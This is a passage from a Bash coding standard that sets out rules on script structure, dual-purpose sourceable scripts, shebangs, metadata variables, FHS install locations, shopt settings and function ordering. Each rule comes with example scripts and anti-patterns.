7. Scattered declarations
8. Unprotected sourcing

---

## Edge Cases

See **BCS010103**:
1. Tiny scripts (<200 lines) - May skip `main()`
2. Sourced libraries - Skip `set -e`, `main()`, invocation
3. External configuration - Add config sourcing
4. Platform-specific code - Add platform detection
5. Cleanup traps - Add trap handlers

---

## Structural Tables

### Executable Scripts

| Order | Status | Step |
|-------|--------|------|
| 0 | Man | Shebang |
| 1 | Opt | ShellCheck |
| 2 | Opt | Description |
| 3 | Man | `set -euo pipefail` |
| 4 | Opt | Bash 5 test |
| 5 | Rec | `shopt` |
| 6 | Rec | Metadata |
| 7 | Rec | Globals |
| 8 | Rec | Colors |
| 9 | Rec | Utilities |
| 10 | Rec | Business logic |
| 11 | Rec | `main()` |
| 12 | Rec | `main "$@"` |
| 13 | Man | `#end` |

### Module/Library Scripts

| Order | Status | Step |
|-------|--------|------|
| 0 | Man | Shebang |
| 1-9 | Opt | See executable (skip step 3) |
| 10 | Rec | Business logic |
| 13 | Man | `#end` |

### Dual-Purpose Scripts

| Order | Step |
|-------|------|
| 0-10 | Module section |
| 14 | `[[ "${BASH_SOURCE[0]}" == "$0" ]] \|\| return 0` |
| 14.0-14.13 | Executable section |

---

## Summary

**13-step layout strongly recommended:**

1. **Safety** - Error handling first
2. **Consistency** - Same pattern everywhere
3. **Testing** - `main()` enables sourcing
4. **Error Prevention** - Dependencies defined before use
5. **Documentation** - Structure reveals intent
6. **Maintenance** - Predictable organization

**Scripts >100 lines:** All 13 steps
**Scripts <100 lines:** Steps 11-12 optional

Use complete structure when in doubt. Deviations rare and well-justified.


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Scripts designed to work as both standalone executables and sourceable libraries must apply `set -euo pipefail` and `shopt` settings **ONLY when executed directly, NOT when sourced**.

**Rationale:** Sourcing a script that applies `set -e` or modifies `shopt` settings would alter the calling shell's environment, potentially breaking the caller's error handling or glob behavior. The sourced script should provide functions/variables without modifying shell state.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION='1.0.0'
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern breakdown:**

1. **Function definitions first** - Define all library functions at top, export with `declare -fx` if needed by subshells
2. **Early return** - `[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0` - when sourced: functions loaded then immediate exit; when executed: test fails, continues
3. **Visual separator** - Comment line marks executable section boundary
4. **Set and shopt** - Only applied when executed (after separator)
5. **Metadata with guard** - `if [[ ! -v SCRIPT_VERSION ]]` prevents re-initialization, safe to source multiple times

**Alternative pattern (if/else block for different initialization per mode):**
```bash
#!/bin/bash

# Functions first
process_data() { ... }
declare -fx process_data

# Dual-mode initialization
if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  DATA_DIR=${DATA_DIR:-/tmp/test_data}
  # Export functions, return to caller
fi
```

**Key principles:**
- Prefer early return pattern for clarity
- Place all function definitions before sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata initialization with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` (execute) and `source script.sh` (source)

**Use cases:**
- Utility libraries that demonstrate usage when executed
- Scripts providing reusable functions plus CLI interface
- Test frameworks sourceable for functions or runnable for tests


---


**Rule: BCS0102**

## Shebang and Initial Setup

First lines must include: `#!shebang`, global `#shellcheck` directives (optional), brief script description, then `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**

1. `#!/bin/bash` - Most portable for Linux systems (bash in standard location)
2. `#!/usr/bin/bash` - FreeBSD/BSD systems (bash in /usr/bin)
3. `#!/usr/bin/env bash` - Maximum portability (searches PATH, works across diverse environments)

**Rationale:** These three shebangs cover all common scenarios. First command must be `set -euo pipefail` to enable strict error handling immediately before any other commands execute.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings. Declare as readonly using `declare -r`.**

**Rationale:**

- **Reliable Path Resolution**: `realpath` provides canonical absolute paths and fails early if script doesn't exist
- **Self-Documentation**: VERSION provides clear versioning for deployment and debugging
- **Resource Location**: SCRIPT_DIR enables reliable loading of companion files and configuration
- **Logging**: SCRIPT_NAME provides consistent script identification in logs/errors
- **Defensive Programming**: Readonly metadata prevents accidental modification
- **Consistency**: Standard variables work identically across all scripts

**Standard metadata pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Script metadata - immediately after shopt
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Metadata variables:**

**1. VERSION**
- Semantic version (Major.Minor.Patch: '1.0.0', '2.3.1')
- Used for `--version` output, logging, deployment tracking

```bash
VERSION='1.0.0'
show_version() { echo "$SCRIPT_NAME $VERSION"; }
```

**2. SCRIPT_PATH**
- Absolute canonical path to script file
- Command: `realpath -- "$0"`
  - `--`: Prevents option injection if filename starts with `-`
  - Resolves symlinks, relative paths, `.` and `..` components
  - Fails if file doesn't exist (intentional - catches errors early)
  - Loadable builtin available for maximum performance

```bash
SCRIPT_PATH=$(realpath -- "$0")
# Examples: /usr/local/bin/myapp, /home/user/projects/app/deploy.sh
```

**3. SCRIPT_DIR**
- Directory containing the script
- Derivation: `${SCRIPT_PATH%/*}` (removes last `/` and everything after)

```bash
SCRIPT_DIR=${SCRIPT_PATH%/*}
# Load library from same directory
source "$SCRIPT_DIR/lib/common.sh"
# Read config from relative path
config_file="$SCRIPT_DIR/../conf/app.conf"
```

**4. SCRIPT_NAME**
- Base name of script (filename only, no path)
- Derivation: `${SCRIPT_PATH##*/}` (removes everything up to last `/`)

```bash
SCRIPT_NAME=${SCRIPT_PATH##*/}
# Use in error messages and help text
die() {
  local -i exit_code=$1
  shift
  >&2 echo "$SCRIPT_NAME: error: $*"
  exit "$exit_code"
}
```

**Why declare -r for metadata:**

```bash
# ✓ Correct - declare as readonly immediately
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Benefits:
# 1. Makes each variable immediately immutable at declaration
# 2. Concise single-line declarations
# 3. SCRIPT_DIR and SCRIPT_NAME combined (both derived from SCRIPT_PATH)
# 4. SC2155 disable documents intentional command substitution in declare -r
```

**Resource location pattern:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Load libraries relative to script location
source "$SCRIPT_DIR/lib/logging.sh"

# Load configuration
declare -- config_file="$SCRIPT_DIR/../etc/app.conf"
[[ -f "$config_file" ]] && source "$config_file"

# Access data files
declare -- data_dir="$SCRIPT_DIR/../share/data"
[[ -d "$data_dir" ]] || die 2 "Data directory not found: $data_dir"

# Use metadata in logging
info "Starting $SCRIPT_NAME $VERSION"
```

**Why realpath over readlink:**

```bash
# realpath is canonical BCS approach because:
# 1. Simpler syntax - no flags needed (default behavior is correct)
# 2. Builtin available - loadable builtin provides maximum performance
# 3. Widely available - standard on modern Linux systems
# 4. POSIX compliant - realpath is POSIX, readlink is GNU-specific
# 5. Consistent behavior - fails if file doesn't exist (catches errors early)

# ✓ Correct
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Avoid - requires -en flags, GNU-specific
SCRIPT_PATH=$(readlink -en -- "$0")
```

**About shellcheck SC2155:**

```bash
# SC2155 warns about command substitution in declare -r
# It masks the return value of the command

declare -r SCRIPT_PATH=$(realpath -- "$0")
#shellcheck disable=SC2155

# Why we disable SC2155 for SCRIPT_PATH:
# 1. realpath failure is acceptable - we WANT script to fail early if file missing
# 2. Metadata variables set exactly once at script startup
# 3. Command substitution is simple and well-understood
# 4. Pattern is concise and immediately makes variable readonly

# Alternative (avoiding SC2155) is more verbose:
SCRIPT_PATH=$(realpath -- "$0") || die 1 "Failed to resolve script path"
declare -r SCRIPT_PATH
```

**Anti-patterns:**

```bash
# ✗ Wrong - using $0 directly without realpath
SCRIPT_PATH="$0"  # Could be relative path or symlink

# ✓ Correct
SCRIPT_PATH=$(realpath -- "$0")

# ✗ Wrong - using dirname/basename (requires external commands)
SCRIPT_DIR=$(dirname "$0")
SCRIPT_NAME=$(basename "$0")

# ✓ Correct - parameter expansion (faster, more reliable)
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✗ Wrong - using PWD for script directory
SCRIPT_DIR="$PWD"  # Wrong! This is current working directory

# ✓ Correct
SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - making readonly individually
readonly VERSION='1.0.0'
readonly SCRIPT_PATH=$(realpath -- "$0")
readonly SCRIPT_DIR=${SCRIPT_PATH%/*}  # Can't assign to readonly variable!

# ✓ Correct - declare as readonly immediately
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}

# ✗ Wrong - inconsistent variable names
SCRIPT_VERSION='1.0.0'  # Should be VERSION
SCRIPT_DIRECTORY="$SCRIPT_DIR"  # Redundant
MY_SCRIPT_PATH="$SCRIPT_PATH"  # Non-standard

# ✓ Correct - standard names
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**Edge cases:**

```bash
# Script in root directory
# If script is /myscript
SCRIPT_DIR=${SCRIPT_PATH%/*}  # Results in empty string!

# Solution:
SCRIPT_DIR=${SCRIPT_PATH%/*}
[[ -z "$SCRIPT_DIR" ]] && SCRIPT_DIR='/'
readonly -- SCRIPT_DIR

# Sourced vs executed
if [[ "${BASH_SOURCE[0]}" != "$0" ]]; then
  # Script is being sourced
  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
else
  # Script is being executed
  SCRIPT_PATH=$(realpath -- "$0")
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- LOG_FILE="$SCRIPT_DIR/../logs/$SCRIPT_NAME.log"
declare -- CONFIG_FILE="$SCRIPT_DIR/../etc/$SCRIPT_NAME.conf"

info() { echo "[$SCRIPT_NAME] $*" | tee -a "$LOG_FILE"; }
error() { >&2 echo "[$SCRIPT_NAME] ERROR: $*" | tee -a "$LOG_FILE"; }
die() {
  local -i exit_code=$1
  shift
  error "$*"
  exit "$exit_code"
}

show_version() { echo "$SCRIPT_NAME $VERSION"; }

show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]

Options:
  -h, --help     Show this help
  -V, --version  Show version

Version: $VERSION
Location: $SCRIPT_PATH
EOF
}

load_config() {
  if [[ -f "$CONFIG_FILE" ]]; then
    info "Loading config from $CONFIG_FILE"
    source "$CONFIG_FILE"
  else
    die 2 "Config not found: $CONFIG_FILE"
  fi
}

main() {
  info "Starting $SCRIPT_NAME $VERSION"
  load_config
  info 'Processing complete'
}

main "$@"
#fin
```

**Summary:**

- Declare VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME immediately after `shopt`
- Use `realpath` to resolve SCRIPT_PATH (canonical BCS approach)
- Derive SCRIPT_DIR and SCRIPT_NAME from SCRIPT_PATH using parameter expansion
- Declare as readonly with `declare -r` immediately
- Use for resource location, logging, error messages, version display
- Handle edge cases: root directory, sourced scripts


---


**Rule: BCS0104**

## Filesystem Hierarchy Standard (FHS) Preference

**Follow FHS for scripts that install files or search for resources. FHS enables predictable locations, supports multiple installation types, and integrates with package managers.**

**Rationale:** Predictable locations users expect, works in development/local/system/user scenarios, eliminates hardcoded paths, portable across distributions with PREFIX customization.

**Common locations:**
- `/usr/local/{bin,share,lib,etc}` - User-installed (system-wide)
- `/usr/{bin,share}` - System (package manager)
- `$HOME/.local/{bin,share}` - User-specific
- `${XDG_CONFIG_HOME:-$HOME/.config}` - User config

**Search pattern:**
```bash
find_data_file() {
  local -- script_dir="$1" filename="$2"
  local -a search_paths=(
    "$script_dir/$filename"
    /usr/local/share/myapp/"$filename"
    /usr/share/myapp/"$filename"
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done
  return 1
}
```

**Installation script:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- PREFIX="${PREFIX:-/usr/local}"
declare -- BIN_DIR="$PREFIX/bin"
declare -- SHARE_DIR="$PREFIX/share/myapp"
declare -- LIB_DIR="$PREFIX/lib/myapp"
declare -- ETC_DIR="$PREFIX/etc/myapp"
declare -- MAN_DIR="$PREFIX/share/man/man1"
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR MAN_DIR

install_files() {
  install -d "$BIN_DIR" "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR" "$MAN_DIR"
  install -m 755 "$SCRIPT_DIR/myapp" "$BIN_DIR/myapp"
  install -m 644 "$SCRIPT_DIR/data/template.txt" "$SHARE_DIR/template.txt"
  install -m 644 "$SCRIPT_DIR/lib/common.sh" "$LIB_DIR/common.sh"
  [[ -f "$ETC_DIR/myapp.conf" ]] || \
    install -m 644 "$SCRIPT_DIR/myapp.conf.example" "$ETC_DIR/myapp.conf"
  install -m 644 "$SCRIPT_DIR/docs/myapp.1" "$MAN_DIR/myapp.1"
}

uninstall_files() {
  rm -f "$BIN_DIR/myapp" "$SHARE_DIR/template.txt" "$LIB_DIR/common.sh" "$MAN_DIR/myapp.1"
  rmdir --ignore-fail-on-non-empty "$SHARE_DIR" "$LIB_DIR" "$ETC_DIR"
}

main() {
  case "${1:-install}" in
    install)   install_files ;;
    uninstall) uninstall_files ;;
    *)         die 2 "Usage: $SCRIPT_NAME {install|uninstall}" ;;
  esac
}

main "$@"
#fin
```

**Resource loading:**

```bash
find_data_file() {
  local -- filename="$1"
  local -a search_paths=(
    "$SCRIPT_DIR/$filename"
    "/usr/local/share/myapp/$filename"
    "/usr/share/myapp/$filename"
    "${XDG_DATA_HOME:-$HOME/.local/share}/myapp/$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done
  die 2 "Data file not found: $filename"
}

find_config_file() {
  local -- filename="$1"
  local -a search_paths=(
    "${XDG_CONFIG_HOME:-$HOME/.config}/myapp/$filename"
    "/usr/local/etc/myapp/$filename"
    "/etc/myapp/$filename"
    "$SCRIPT_DIR/$filename"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { echo "$path"; return 0; }
  done
  return 1
}

load_library() {
  local -- lib_name="$1"
  local -a search_paths=(
    "$SCRIPT_DIR/lib/$lib_name"
    "/usr/local/lib/myapp/$lib_name"
    "/usr/lib/myapp/$lib_name"
  )

  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path" ]] && { source "$path"; return 0; }
  done
  die 2 "Library not found: $lib_name"
}
```

**Makefile:**

```bash
PREFIX ?= /usr/local
BINDIR = $(PREFIX)/bin
SHAREDIR = $(PREFIX)/share/myapp
MANDIR = $(PREFIX)/share/man/man1

install:
	install -d $(BINDIR) $(SHAREDIR) $(MANDIR)
	install -m 755 myapp $(BINDIR)/myapp
	install -m 644 data/template.txt $(SHAREDIR)/template.txt
	install -m 644 docs/myapp.1 $(MANDIR)/myapp.1

uninstall:
	rm -f $(BINDIR)/myapp $(SHAREDIR)/template.txt $(MANDIR)/myapp.1
```

**XDG support:**

```bash
declare -- XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
declare -- XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
declare -- XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
declare -- XDG_STATE_HOME="${XDG_STATE_HOME:-$HOME/.local/state}"

declare -- USER_DATA_DIR="$XDG_DATA_HOME/myapp"
declare -- USER_CONFIG_DIR="$XDG_CONFIG_HOME/myapp"

install -d "$USER_DATA_DIR" "$USER_CONFIG_DIR"
```

**Production template (from bcs):**

```bash
find_bcs_file() {
  local -- script_dir=$1
  local -- install_share="${script_dir%/bin}/share/yatti/bash-coding-standard"
  local -a search_paths=(
    "$script_dir"
    "$install_share"
    /usr/local/share/yatti/bash-coding-standard
    /usr/share/yatti/bash-coding-standard
  )
  local -- path
  for path in "${search_paths[@]}"; do
    [[ -f "$path"/BASH-CODING-STANDARD.md ]] && \
      { echo "$path"/BASH-CODING-STANDARD.md; return 0; }
  done
  return 1
}
declare -fx find_bcs_file
```

**Key features:** `install_share` calculation `${script_dir%/bin}/share/...`, four search locations, early return, works in dev/PREFIX/local/system.

**Find directory:**

```bash
find_data_dir() {
  local -- install_share="${BCS_DIR%/bin}/share/yatti/bash-coding-standard/data"
  local -a search_paths=(
    "$BCS_DIR/data"
    "$install_share"
    /usr/local/share/yatti/bash-coding-standard/data
    /usr/share/yatti/bash-coding-standard/data
  )
  local -- path
  for path in "${search_paths[@]}"; do
    [[ -d "$path" ]] && { echo "$path"; return 0; }
  done
  return 1
}
```

**Generic finder:**

```bash
find_resource() {
  local -- type=$1 name=$2
  local -- install_base="${SCRIPT_DIR%/bin}/share/myorg/myproject"
  local -a search_paths=(
    "$SCRIPT_DIR"
    "$install_base"
    /usr/local/share/myorg/myproject
    /usr/share/myorg/myproject
  )

  local -- path
  for path in "${search_paths[@]}"; do
    local -- resource="$path/$name"
    case "$type" in
      file) [[ -f "$resource" ]] && { echo "$resource"; return 0; } ;;
      dir)  [[ -d "$resource" ]] && { echo "$resource"; return 0; } ;;
      *)    die 2 "Invalid type ${type@Q}" ;;
    esac
  done
  return 1
}

# Usage: CONFIG=$(find_resource file config.yml) || die 'Not found'
```

**Anti-patterns:**

```bash
# ✗ Hardcoded path
data_file='/home/user/projects/myapp/data/template.txt'
# ✓ FHS search
data_file=$(find_data_file 'template.txt')

# ✗ Assuming location
source /usr/local/lib/myapp/common.sh
# ✓ Search
load_library 'common.sh'

# ✗ Relative from CWD
source ../lib/common.sh
# ✓ Relative to script
source "$SCRIPT_DIR/../lib/common.sh"

# ✗ No PREFIX support
BIN_DIR=/usr/local/bin
# ✓ PREFIX
PREFIX="${PREFIX:-/usr/local}"; BIN_DIR="$PREFIX/bin"

# ✗ Overwrite config
install myapp.conf "$PREFIX/etc/myapp/myapp.conf"
# ✓ Preserve
[[ -f "$PREFIX/etc/myapp/myapp.conf" ]] || \
  install myapp.conf.example "$PREFIX/etc/myapp/myapp.conf"
```

**Edge cases:**

```bash
# PREFIX trailing slash
PREFIX="${PREFIX:-/usr/local}"
PREFIX="${PREFIX%/}"

# Permission check
[[ -w "$PREFIX" ]] || die 5 "No write permission. Try: PREFIX=\$HOME/.local make install"
```

**When NOT to use:** Single-user scripts, project-specific tools staying in project directory, containers using `/app`, embedded systems with custom layouts.

**Summary:** Use FHS for system-wide/distributed scripts. PREFIX for custom locations. Search multiple locations. Separate by type (bin/share/etc/lib). Support XDG. Preserve user config. Make PREFIX customizable.


---


**Rule: BCS0105**

## shopt

**Recommended settings:**

```bash
# STRONGLY RECOMMENDED - apply to all scripts
shopt -s inherit_errexit  # Makes set -e work in subshells/command substitutions
shopt -s shift_verbose    # Error on shift with no arguments
shopt -s extglob          # Extended glob patterns like !(*.txt)

# CHOOSE ONE:
shopt -s nullglob   # Unmatched globs � empty (for loops/arrays)
    # OR
shopt -s failglob   # Unmatched globs � error (for strict scripts)

# OPTIONAL:
shopt -s globstar   # Enable ** for recursive matching (slow on deep trees)
```

**Rationale:**

**`inherit_errexit` (CRITICAL)** - Without it, `set -e` does NOT apply inside `$(...)` or `(...)`. Errors in command substitutions will not exit the script:
```bash
set -e  # Without inherit_errexit
result=$(false)  # Does NOT exit the script!

# With inherit_errexit
shopt -s inherit_errexit
result=$(false)  # Script exits here as expected
```

**`shift_verbose`** - Without it, `shift` silently fails when no arguments remain. With it, prints error and respects `set -e`.

**`extglob`** - Enables advanced patterns: `?(pattern)`, `*(pattern)`, `+(pattern)`, `@(pattern)`, `!(pattern)`:
```bash
rm !(*.txt)                        # Delete everything EXCEPT .txt files
cp *.@(jpg|png|gif) /dest/         # Multiple extensions
[[ $input == +([0-9]) ]] && ...    # Match one or more digits
```

**`nullglob` vs `failglob`:**

**`nullglob`** (for loops/arrays) - Unmatched glob expands to empty:
```bash
for file in *.txt; do  # If no .txt files, loop body never executes
  echo "$file"
done
files=(*.log)  # If no .log files: files=() (empty array)
```

**`failglob`** (strict scripts) - Unmatched glob causes error:
```bash
cat *.conf  # If no .conf files: error and exits with set -e
```

**Without either (dangerous default):**
```bash
for file in *.txt; do  # If no .txt files, $file = literal "*.txt"
  rm "$file"           # Tries to delete file named "*.txt"!
done
```

**`globstar` (OPTIONAL)** - Enables `**` for recursive matching (can be slow):
```bash
for script in **/*.sh; do  # Recursively find all .sh files
  shellcheck "$script"
done
```

**Typical configuration:**
```bash
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
```

**When NOT to use:**
- Interactive scripts (need lenient behavior)
- Legacy compatibility (older bash versions)
- Performance-critical loops (`globstar` slow on large trees)


---


**Rule: BCS0106**

## File Extensions
- Executables: `.sh` extension or no extension
- Libraries: Must have `.sh` extension, should not be executable
- Dual-purpose (library + executable): `.sh` or no extension
- Global PATH executables: Always no extension


---


**Rule: BCS0107**

## Function Organization

**Always organize functions bottom-up: lowest-level primitives first, then composition layers, ending with `main()`. This eliminates forward reference issues and makes scripts readable and maintainable.**

**Rationale:**

- **No Forward References**: Bash reads top-to-bottom; dependency order ensures called functions exist before use
- **Readability**: Readers understand primitives first, then see compositions
- **Debugging/Maintainability**: Clear dependency hierarchy reveals where to add functions
- **Testability**: Low-level functions tested independently before higher-level compositions
- **Cognitive Load**: Understanding small pieces first reduces mental overhead

**Standard 7-layer pattern:**

```bash
#!/bin/bash
set -euo pipefail

# 1. Messaging (lowest level - used by everything)
_msg() { ... }
info() { >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# 2. Documentation (no dependencies)
show_help() { ... }

# 3. Helpers/utilities
yn() { ... }
noarg() { ... }

# 4. Validation (check prerequisites)
check_root() { ... }
check_prerequisites() { ... }

# 5. Business logic (domain operations)
build_standalone() { ... }
install_standalone() { ... }

# 6. Orchestration
show_completion_message() { ... }

# 7. Main (highest level - orchestrates everything)
main() {
  check_root
  check_prerequisites
  build_standalone
  install_standalone
  show_completion_message
}

main "$@"
#fin
```

**Key principle:** Each function can safely call functions defined ABOVE it. Dependencies flow downward: higher functions call lower, never upward.

```
[Layer 1: Messaging] ← Primitives, no dependencies
     ↓
[Layer 2: Documentation] ← Can call Layer 1
     ↓
[Layer 3: Utilities] ← Can call Layers 1-2
     ↓
[Layer 4: Validation] ← Can call Layers 1-3
     ↓
[Layer 5: Business Logic] ← Can call Layers 1-4
     ↓
[Layer 6: Orchestration] ← Can call Layers 1-5
     ↓
[Layer 7: main()] ← Can call all layers
```

**Layer descriptions:**

**1. Messaging** - `_msg()`, `info()`, `warn()`, `error()`, `die()`, `success()`, `debug()`, `vecho()`. Pure I/O primitives, no dependencies.

**2. Documentation** - `show_help()`, `show_version()`, `show_usage()`. Display help/usage, may use messaging.

**3. Utilities** - `yn()`, `noarg()`, `trim()`, `s()`, `decp()`. Generic utilities, may use messaging.

**4. Validation** - `check_root()`, `check_prerequisites()`, `validate_input()`. Verify preconditions, use utilities/messaging.

**5. Business Logic** - Domain operations like `build_project()`, `process_file()`. Core functionality using all lower layers.

**6. Orchestration** - `run_build_phase()`, `cleanup()`. Coordinate multiple business functions.

**7. main()** - Top-level script flow, can call any function.

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=0 DRY_RUN=0
declare -- BUILD_DIR='/tmp/build'

# Layer 1: Messaging
_msg() { echo "[${FUNCNAME[1]}] $*"; }
info() { >&2 _msg "$@"; }
warn() { >&2 _msg "WARNING: $*"; }
error() { >&2 _msg "ERROR: $*"; }
die() { local -i exit_code=$1; shift; (($#)) && error "$@"; exit "$exit_code"; }
success() { >&2 _msg "SUCCESS: $*"; }
debug() { ((VERBOSE)) && >&2 _msg "DEBUG: $*"; return 0; }

# Layer 2: Documentation
show_version() { echo "$SCRIPT_NAME $VERSION"; }
show_help() {
  cat << EOF
Usage: $SCRIPT_NAME [OPTIONS]
Options:
  -v, --verbose   Enable verbose output
  -n, --dry-run   Dry-run mode
  -h, --help      Show help
EOF
}

# Layer 3: Utilities
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
noarg() { (($# < 2)) && die 2 "Option $1 requires an argument"; }

# Layer 4: Validation
check_prerequisites() {
  info 'Checking prerequisites...'
  local -- cmd
  for cmd in git make tar; do
    command -v "$cmd" >/dev/null 2>&1 || die 1 "Required command not found: $cmd"
  done
  [[ -w "${BUILD_DIR%/*}" ]] || die 5 "Cannot write to: $BUILD_DIR"
  success 'Prerequisites OK'
}

validate_config() {
  [[ -f 'config.conf' ]] || die 2 'Configuration file not found'
  source 'config.conf'
  [[ -n "${APP_NAME:-}" ]] || die 22 'APP_NAME not set'
  [[ -n "${APP_VERSION:-}" ]] || die 22 'APP_VERSION not set'
}

# Layer 5: Business logic
clean_build_dir() {
  info "Cleaning: $BUILD_DIR"
  ((DRY_RUN)) && { info '[DRY-RUN] Would remove build directory'; return 0; }
  [[ -d "$BUILD_DIR" ]] && rm -rf "$BUILD_DIR"
  install -d "$BUILD_DIR"
  success "Build directory ready"
}

compile_sources() {
  info 'Compiling...'
  ((DRY_RUN)) && { info '[DRY-RUN] Would compile'; return 0; }
  make -C src all BUILD_DIR="$BUILD_DIR"
  success 'Compiled'
}

run_tests() {
  info 'Testing...'
  ((DRY_RUN)) && { info '[DRY-RUN] Would test'; return 0; }
  make -C tests all
  success 'Tests passed'
}

create_package() {
  local -- package_file="$BUILD_DIR/app.tar.gz"
  ((DRY_RUN)) && { info "[DRY-RUN] Would create: $package_file"; return 0; }
  tar -czf "$package_file" -C "$BUILD_DIR" .
  success "Package: $package_file"
}

# Layer 6: Orchestration
run_build_phase() {
  clean_build_dir
  compile_sources
  run_tests
}

run_package_phase() {
  create_package
}

# Layer 7: Main
main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -h|--help)    show_help; exit 0 ;;
    -V|--version) show_version; exit 0 ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            die 2 "Unexpected argument: $1" ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN

  info "Starting $SCRIPT_NAME $VERSION"
  ((DRY_RUN)) && info 'DRY-RUN MODE'

  check_prerequisites
  validate_config
  run_build_phase
  run_package_phase

  success "Completed"
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Wrong - main() at top (forward references)
main() { build_project; }  # Not defined yet!
build_project() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
main() { build_project; }

# ✗ Wrong - business logic before utilities
